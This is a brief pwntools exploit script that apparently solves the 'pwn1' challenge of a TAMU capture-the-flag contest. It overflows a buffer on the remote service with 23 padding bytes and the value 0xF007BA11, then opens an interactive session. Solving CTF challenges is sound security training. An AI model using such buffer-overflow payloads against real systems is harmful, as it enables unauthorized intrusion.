#!/usr/bin/env python

from pwn import *

r = remote('pwn.ctf.tamu.edu', 4321)
# r = process('./pwn1')

r.recvuntil('my secret?')
r.sendline('a' * 23 + p32(0xF007BA11))

r.interactive()
